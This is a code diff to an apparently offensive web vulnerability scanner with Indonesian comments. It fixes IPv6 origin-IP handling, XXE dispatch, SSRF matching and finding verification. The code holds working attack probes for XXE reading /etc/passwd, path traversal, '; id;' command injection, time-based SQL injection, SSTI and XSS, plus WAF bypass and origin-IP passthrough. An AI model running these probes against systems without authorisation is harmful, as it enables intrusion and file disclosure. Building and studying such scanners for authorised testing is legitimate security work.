@@ -2,6 +2,7 @@ import sys
 import os
 import re
 import asyncio
+import ipaddress
 import time
 import random
 from typing import List, Dict, Optional
@@ -12,6 +13,18 @@ from core.ui import B, C, G, N, R, W, Y, i, p, s, w
 from modules.auth.bypass import WAFBypass
 from core.network import thttp
 from runners.shared import inject_query_payload
+
+
+def _is_ip_literal(host: str) -> bool:
+    """True untuk IPv4/IPv6 literal. Cek lama hostname.replace('.','').isdigit()
+    melewatkan IPv6 (ada titik-koma? tidak — ada colon, lolos sebagai non-IP)."""
+    if not host:
+        return False
+    try:
+        ipaddress.ip_address(host.strip("[]"))
+        return True
+    except ValueError:
+        return False
 
 
 class SmartPayloadGenerator:
@@ -141,6 +154,10 @@ class ParamClassifier:
             checks.extend([engine.ssrf, engine.open_redirect, engine.xss])
         elif is_file:
             checks.extend([engine.lfi, engine.sqli])
+            # engine.xxe dulu tak pernah didispatch siapa pun — deteksi XXE
+            # mati total. POST-body hanya saat caller mengizinkan (allow_post).
+            if getattr(engine, "allow_post", True):
+                checks.append(engine.xxe)
         elif is_template:
             checks.extend([engine.ssti, engine.xss])
         elif is_json:
@@ -167,11 +184,15 @@ class AsyncVulnEngine:
         session_manager=None,
         concurrency: int = 25,
         bypass: bool = True,
+        allow_post: bool = True,
     ):
         self.engine = network_engine
         self.session_manager = session_manager
         self.concurrency = concurrency
         self.bypass = bypass
+        # allow_post=False (mode 3/5) menahan check POST-body (xxe) —
+        # selaras dengan kontrak runner; True (mode 4 dsb.) = jalankan.
+        self.allow_post = allow_post
         self._sem = asyncio.Semaphore(concurrency)
 
     async def _send(self, url: str, method: str = "GET", headers: dict = None,
@@ -181,22 +202,33 @@ class AsyncVulnEngine:
             req_headers = dict(headers or {})
 
             # Origin IP passthrough: inject Host header + use curl --resolve for SNI
-            if hostname and hostname.replace(".", "").isdigit():
-                origin_domain = None
-                if self.session_manager and self.session_manager.auth_tokens:
+            if _is_ip_literal(hostname):
+                # Lookup urutan: peta per-URL (presisi) → peta per-IP →
+                # fallback historis dari auth_tokens. Dulu Host dipilih acak
+                # dari key pertama auth_tokens dan IPv6 tak terdeteksi sama
+                # sekali — vhost salah / TLS gagal senyap.
+                overrides = getattr(self.engine, "origin_host_overrides", None) or {}
+                origin_domain = overrides.get(url) or (
+                    getattr(self.engine, "origin_host_map", None) or {}).get(hostname)
+                if not origin_domain and self.session_manager and self.session_manager.auth_tokens:
                     for domain in self.session_manager.auth_tokens:
-                        if domain and not domain.replace(".", "").isdigit():
+                        if domain and not _is_ip_literal(domain):
                             origin_domain = domain
-                            req_headers.setdefault("Host", domain)
                             break
-                # Use curl --resolve for proper SNI when scanning origin IP
                 if origin_domain:
+                    req_headers.setdefault("Host", origin_domain)
+                # curl --resolve butuh domain valid; IPv6 literal / IP-galat
+                # tetap lewat httpx biasa (Host header sudah terpasang).
+                if origin_domain and ":" not in origin_domain:
                     from core.curl_send import curl_send
+                    # Teruskan policy: jalur curl_send dulu lolos scope,
+                    # max_requests dan audit (beda dengan ahttp_send).
                     result = await asyncio.to_thread(
                         curl_send, url,
                         resolve_domain=origin_domain, resolve_ip=hostname,
                         method=method, headers=req_headers, data=data,
                         timeout=timeout,
+                        policy=getattr(self.engine, "policy", None),
                     )
                     return result
 
@@ -231,7 +263,7 @@ class AsyncVulnEngine:
                             continue
                         if payload.startswith("<") and payload[:4].lower() not in body.lower():
                             continue
-                        return {"type": "reflected_xss", "title": "Reflected XSS", "url": target[:200],
+                        return {"type": "reflected_xss", "title": "Reflected XSS", "url": target,
                                 "detail": f"Param: {param}, Trigger: {trigger}", "bypass": "enabled" if self.bypass else "none",
                                 "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0),
                                 "confidence": "confirmed"}
@@ -257,7 +289,7 @@ class AsyncVulnEngine:
                 body = r.get("body") or ""
                 if any(re.search(ep, body, re.I) and not re.search(ep, baseline_body, re.I) for ep in error_patterns):
                     s(f"SQLi (Error-based) CONFIRMED on {Y}{param}{N} with payload: {C}{payload}{N}")
-                    return {"type": "sqli_error", "title": "SQL Injection (Error-based)", "url": target[:200],
+                    return {"type": "sqli_error", "title": "SQL Injection (Error-based)", "url": target,
                             "detail": f"Param: {param}", "bypass": "enabled" if self.bypass else "none",
                             "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
 
@@ -273,7 +305,7 @@ class AsyncVulnEngine:
                 ctrl_elapsed = ctrl_r.get("time", 0)
                 if ctrl_elapsed < baseline_mean + 2.0:
                     s(f"SQLi (Time-based) CONFIRMED on {Y}{param}{N}! Delay: {elapsed:.2f}s (Control: {ctrl_elapsed:.2f}s)")
-                    return {"type": "sqli_time", "title": "SQL Injection (Time-based)", "url": target[:200],
+                    return {"type": "sqli_time", "title": "SQL Injection (Time-based)", "url": target,
                             "detail": f"Param: {param}, Delay: {elapsed:.1f}s (baseline: {baseline_mean:.1f}s, threshold: {threshold:.1f}s)",
                             "bypass": "enabled" if self.bypass else "none",
                             "waf": "/".join(r.get("waf", [])), "time": elapsed, "status": r.get("status", 0),
@@ -291,7 +323,7 @@ class AsyncVulnEngine:
             if isinstance(r, dict) and r.get("status", 0) > 0:
                 body = r.get("body") or ""
                 if any(re.search(ind, body, re.I) for ind in indicators):
-                    return {"type": "lfi", "title": "Local File Inclusion (LFI)", "url": target[:200],
+                    return {"type": "lfi", "title": "Local File Inclusion (LFI)", "url": target,
                             "detail": f"Param: {param}", "bypass": "enabled" if self.bypass else "none",
                             "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
         return None
@@ -307,7 +339,7 @@ class AsyncVulnEngine:
             if isinstance(r, dict) and r.get("status", 0) > 0:
                 body = r.get("body") or ""
                 if any(re.search(ind, body, re.I) for ind in indicators):
-                    return {"type": "rce", "title": "RCE / Command Injection", "url": target[:200],
+                    return {"type": "rce", "title": "RCE / Command Injection", "url": target,
                             "detail": f"Param: {param}", "bypass": "enabled" if self.bypass else "none",
                             "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
         return None
@@ -327,9 +359,12 @@ class AsyncVulnEngine:
             if isinstance(r, dict) and r.get("status", 0) > 0:
                 body = r.get("body") or ""
                 headers_str = str(r.get("headers") or "")
-                combined = body + "\n" + headers_str
-                if any(ind in combined for ind in indicators):
-                    return {"type": "ssrf", "title": "Server-Side Request Forgery (SSRF)", "url": target[:200],
+                # Case-insensitive: httpx/curl_cffi men-normalisasi kunci
+                # header ke huruf kecil, jadi indikator "Server:" lama tak
+                # pernah match — test 127.0.0.1:80 jadi no-op.
+                combined = (body + "\n" + headers_str).lower()
+                if any(ind.lower() in combined for ind in indicators):
+                    return {"type": "ssrf", "title": "Server-Side Request Forgery (SSRF)", "url": target,
                             "detail": f"Param: {param}", "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
         return None
 
@@ -348,7 +383,7 @@ class AsyncVulnEngine:
                 body = r["body"]
                 for result in expected_results:
                     if result in body and result not in baseline_body:
-                        return {"type": "ssti", "title": "SSTI (Server-Side Template Injection)", "url": target[:200],
+                        return {"type": "ssti", "title": "SSTI (Server-Side Template Injection)", "url": target,
                                 "detail": f"Param: {param}, Match: {result}", "bypass": "enabled" if self.bypass else "none",
                                 "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
         return None
@@ -360,7 +395,7 @@ class AsyncVulnEngine:
         for p in payloads:
             r = await self._send(url, method="POST", data=p, headers={"Content-Type": "text/xml"}, timeout=12, bypass=False)
             if r.get("status", 0) > 0 and "root:x:0:0:" in (r.get("body", "") or ""):
-                return {"type": "xxe_file", "title": "XXE (XML External Entity)", "url": url[:200],
+                return {"type": "xxe_file", "title": "XXE (XML External Entity)", "url": url,
                         "detail": "File read via XXE", "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
         return None
 
@@ -392,7 +427,7 @@ class AsyncVulnEngine:
                         findings.append({
                             "type": "config_exposure",
                             "title": f"Config/Path Exposure: {path}",
-                            "url": target[:200],
+                            "url": target,
                             "detail": f"Exposed: {path}",
                             "waf": "/".join(r.get("waf", [])),
                             "time": r.get("time", 0),
@@ -405,13 +440,13 @@ class AsyncVulnEngine:
         headers = {k.lower(): v for k, v in r.get("headers", {}).items()}
         findings = []
         if headers.get("x-frame-options") is None:
-            findings.append({"type": "misconfig_header", "title": "Missing X-Frame-Options", "url": url[:200],
+            findings.append({"type": "misconfig_header", "title": "Missing X-Frame-Options", "url": url,
                              "detail": "Clickjacking protection missing", "waf": "", "time": r.get("time", 0), "status": r.get("status", 0)})
         if headers.get("content-security-policy") is None:
-            findings.append({"type": "misconfig_header", "title": "Missing CSP Header", "url": url[:200],
+            findings.append({"type": "misconfig_header", "title": "Missing CSP Header", "url": url,
                              "detail": "No Content-Security-Policy", "waf": "", "time": r.get("time", 0), "status": r.get("status", 0)})
         if headers.get("x-content-type-options") is None:
-            findings.append({"type": "misconfig_header", "title": "Missing X-Content-Type-Options", "url": url[:200],
+            findings.append({"type": "misconfig_header", "title": "Missing X-Content-Type-Options", "url": url,
                              "detail": "MIME-sniffing protection missing", "waf": "", "time": r.get("time", 0), "status": r.get("status", 0)})
         return findings if findings else None
 
@@ -431,7 +466,7 @@ class AsyncVulnEngine:
             headers = {k.lower(): v for k, v in (r.get("headers") or {}).items()}
             location = headers.get("location", "")
             if r.get("status") in (301, 302, 303, 307, 308) and any(canary in location for canary in canaries):
-                return {"type": "open_redirect", "title": "Open Redirect", "url": target[:200],
+                return {"type": "open_redirect", "title": "Open Redirect", "url": target,
                         "detail": f"Redirects to: {location}", "waf": "/".join(r.get("waf", [])),
                         "time": r.get("time", 0), "status": r.get("status", 0)}
         return None
@@ -460,7 +495,7 @@ class AsyncVulnEngine:
             body_lower = body.lower()
             not_found = ["not found", "invalid id", "unauthorized", "access denied", "error", "does not exist"]
             if diff_ratio > 0.15 and not any(nf in body_lower for nf in not_found):
-                return {"type": "idor", "title": "IDOR (Insecure Direct Object Reference)", "url": new_url[:200], "detail": f"Param: {param}",
+                return {"type": "idor", "title": "IDOR (Insecure Direct Object Reference)", "url": new_url, "detail": f"Param: {param}",
                         "waf": "/".join(r.get("waf", [])), "time": r.get("time", 0), "status": r.get("status", 0)}
         return None
 
@@ -475,7 +510,11 @@ class AsyncVulnEngine:
                         findings.extend(result)
                     else:
                         findings.append(result)
-            except Exception:
+            except Exception as e:
+                # Was `except: continue` — a crashed check vanished without
+                # a trace, impossible to tell "not vulnerable" from "bug".
+                w(f"check {getattr(check, '__name__', check)} failed on "
+                  f"{url[:80]}?{param}: {e.__class__.__name__}: {str(e)[:80]}")
                 continue
         return findings
 
@@ -484,11 +523,21 @@ class AsyncVulnEngine:
         tasks = [self.scan_param(url, param) for url, param in targets]
         results = await asyncio.gather(*tasks, return_exceptions=True)
         findings = []
+        crashed = 0
+        last_err = ""
         for r in results:
             if isinstance(r, list):
                 findings.extend(r)
             elif isinstance(r, dict):
                 findings.append(r)
+            elif isinstance(r, BaseException):
+                # Was silently dropped — mass per-pair failures looked like
+                # a clean, empty run.
+                crashed += 1
+                last_err = f"{r.__class__.__name__}: {str(r)[:100]}"
+        if crashed:
+            w(f"scan_many: {crashed}/{len(results)} pair(s) crashed "
+              f"(last: {last_err})")
         return findings
 
 class VulnVerifier:
@@ -534,47 +583,79 @@ class VulnVerifier:
         return any(re.search(p, body or "", re.I) for p in patterns)
 
     @staticmethod
+    def _probe_untestable(*probes) -> bool:
+        """True bila SEMUA probe gagal terkirim (status 0 + error transport:
+        policy_denied / rate-limit / circuit-open). Gagal kirim ≠ tidak
+        vulnerable — sebelumnya temuan valid dibuang senyap saat budget
+        habis atau target sedang backoff."""
+        return bool(probes) and all(
+            isinstance(p, dict) and p.get("status", 0) == 0 and p.get("error")
+            for p in probes)
+
+    @staticmethod
     async def verify(finding: Dict, engine, session_manager=None,
-                     allow_post: bool = True) -> bool:
-        vtype = finding["type"]
-        url = finding["url"]
+                     allow_post: bool = True) -> Optional[bool]:
+        """Tri-state: True = verified, False = refuted, None = untestable
+        (semua probe gagal terkirim — bukan bukti negatif)."""
+        vtype = finding.get("type", "")
+        url = finding.get("url", "")
+        if not vtype or not url:
+            return False
+
+        # dom_xss SEBELUM cek substring "xss" — urutan lama membuat cabang
+        # dom_xss dead code: DOM-XSS dipaksa probe GET literal <svg/onload>
+        # yang mustahil ter-reflect, lalu gugur di verifikasi.
+        if vtype == "dom_xss":
+            return finding.get("confidence", "suspected") != "weak"
 
         if "xss" in vtype:
             proof = "<svg/onload=confirm(1)>"
             r = await engine.ahttp_send(VulnVerifier._with_payload(url, proof), state_context=session_manager)
+            if VulnVerifier._probe_untestable(r):
+                return None
             body = r.get("body", "")
-            return VulnVerifier._probe_ok(r["status"] > 0 and proof in body, r, finding)
+            return VulnVerifier._probe_ok(r.get("status", 0) > 0 and proof in body, r, finding)
 
         elif "sqli" in vtype:
             if vtype == "sqli_time":
                 baseline = await engine.ahttp_send(VulnVerifier._with_payload(url, "1"), timeout=12, state_context=session_manager)
                 delayed = await engine.ahttp_send(VulnVerifier._with_payload(url, "' AND SLEEP(5)-- -"), timeout=15, state_context=session_manager)
+                if VulnVerifier._probe_untestable(baseline, delayed):
+                    return None
                 return VulnVerifier._probe_ok(
                     delayed.get("time", 0) - baseline.get("time", 0) >= 4,
                     delayed, finding)
             probe = await engine.ahttp_send(VulnVerifier._with_payload(url, "'"), timeout=12, state_context=session_manager)
+            if VulnVerifier._probe_untestable(probe):
+                return None
             return VulnVerifier._probe_ok(
-                probe["status"] > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.SQL_ERRORS),
+                probe.get("status", 0) > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.SQL_ERRORS),
                 probe, finding)
 
         elif vtype == "lfi":
             probe = await engine.ahttp_send(VulnVerifier._with_payload(url, "../../../../etc/passwd"), timeout=12, state_context=session_manager)
+            if VulnVerifier._probe_untestable(probe):
+                return None
             return VulnVerifier._probe_ok(
-                probe["status"] > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.LFI_MARKERS),
+                probe.get("status", 0) > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.LFI_MARKERS),
                 probe, finding)
 
         elif vtype == "rce":
             probe = await engine.ahttp_send(VulnVerifier._with_payload(url, "; id;"), timeout=12, state_context=session_manager)
+            if VulnVerifier._probe_untestable(probe):
+                return None
             return VulnVerifier._probe_ok(
-                probe["status"] > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.RCE_MARKERS),
+                probe.get("status", 0) > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.RCE_MARKERS),
                 probe, finding)
 
         elif vtype == "ssti":
             baseline = await engine.ahttp_send(VulnVerifier._with_payload(url, "verd_verify"), timeout=12, state_context=session_manager)
             probe = await engine.ahttp_send(VulnVerifier._with_payload(url, "{{1337*7331}}"), timeout=12, state_context=session_manager)
+            if VulnVerifier._probe_untestable(baseline, probe):
+                return None
             expected = "9801547"
             return VulnVerifier._probe_ok(
-                probe["status"] > 0 and expected in probe.get("body", "") and expected not in baseline.get("body", ""),
+                probe.get("status", 0) > 0 and expected in probe.get("body", "") and expected not in baseline.get("body", ""),
                 probe, finding)
 
         elif vtype == "xxe_file":
@@ -584,19 +665,25 @@ class VulnVerifier:
                 return finding.get("confidence") == "confirmed"
             payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
             probe = await engine.ahttp_send(url, method="POST", data=payload, headers={"Content-Type": "text/xml"}, timeout=12, state_context=session_manager)
+            if VulnVerifier._probe_untestable(probe):
+                return None
             return VulnVerifier._probe_ok(
-                probe["status"] > 0 and "root:x:0:0:" in probe.get("body", ""),
+                probe.get("status", 0) > 0 and "root:x:0:0:" in probe.get("body", ""),
                 probe, finding)
 
         elif vtype == "open_redirect":
             probe = await engine.ahttp_send(url, timeout=12, state_context=session_manager)
+            if VulnVerifier._probe_untestable(probe):
+                return None
             location = probe.get("headers", {}).get("location", "")
             return VulnVerifier._probe_ok(
-                probe["status"] in (301, 302, 303, 307, 308) and any(c in location for c in ["google.com", "example.com"]),
+                probe.get("status", 0) in (301, 302, 303, 307, 308) and any(c in location for c in ["google.com", "example.com"]),
                 probe, finding)
 
         elif vtype == "cors_misconfig":
             probe = await engine.ahttp_send(url, headers={"Origin": "https://evil.com"}, timeout=12, state_context=session_manager)
+            if VulnVerifier._probe_untestable(probe):
+                return None
             headers = probe.get("headers", {})
             return VulnVerifier._probe_ok(
                 headers.get("access-control-allow-origin") == "https://evil.com",
@@ -609,9 +696,6 @@ class VulnVerifier:
             return finding.get("confidence") == "confirmed"
 
         elif vtype == "subdomain_takeover":
-            return finding.get("confidence", "suspected") != "weak"
-
-        elif vtype == "dom_xss":
             return finding.get("confidence", "suspected") != "weak"
 
         elif vtype.startswith("js_secret_"):
@@ -633,7 +717,11 @@ class VulnVerifier:
         }:
             return finding.get("confidence", "confirmed") != "weak"
 
-        return finding.get("confidence") == "confirmed"
+        # Fallback (jwt_*, crlf_*, host_header_*, idor_mass, nuclei_*,
+        # sqli_extracted, ssrf, idor, ...): dulu wajib confidence=="confirmed"
+        # sehingga producer TANPA key confidence (ssrf/idor) selalu gugur dan
+        # "suspected" (crlf/smuggling) tak pernah bisa dilaporkan.
+        return finding.get("confidence", "confirmed") != "weak"
 
 
 class HeuristicVulnEngine:
@@ -654,7 +742,19 @@ class HeuristicVulnEngine:
         if not wafs:
             return {"risk": "Low", "reason": "No WAF detected"}
         payload = "<script>alert(1)</script>"
-        r = thttp(url + "?test=" + quote(payload), bypass=False, policy=policy)
-        if r["status"] == 200 and payload in (r["body"] or ""):
+        # URL-join aman: dulu `url + "?test="` menghasilkan URL ganda bila
+        # url sudah membawa query string (target API umum).
+        sep = "&" if "?" in (url or "") else "?"
+        r = thttp(f"{url}{sep}test={quote(payload)}", bypass=False, policy=policy)
+        status = r.get("status", 0)
+        if status == 200 and payload in (r.get("body") or ""):
             return {"risk": "Low", "reason": f"WAF ({'/'.join(wafs)}) is misconfigured — payloads pass through unblocked."}
-        return {"risk": "Critical", "reason": f"WAF ({'/'.join(wafs)}) is active and blocks basic XSS."}
+        if status == 0:
+            # Request gagal terkirim (policy/rate-limit/DNS) bukan bukti WAF
+            # aktif — verdict Critical lama selalu salah untuk kasus ini.
+            return {"risk": "Unknown", "reason": f"Probe not dispatched ({r.get('error') or 'no response'}) — verdict skipped."}
+        if status in (403, 406, 429, 503):
+            return {"risk": "Critical", "reason": f"WAF ({'/'.join(wafs)}) is active and blocks basic XSS (HTTP {status})."}
+        # Non-200 / tak memantulkan: API atau app non-HTML sering tidak
+        # merefleksikan payload — jangan langsung vonis Critical.
+        return {"risk": "Medium", "reason": f"WAF ({'/'.join(wafs)}) responded HTTP {status} without reflecting the probe — active blocking likely but unconfirmed."}
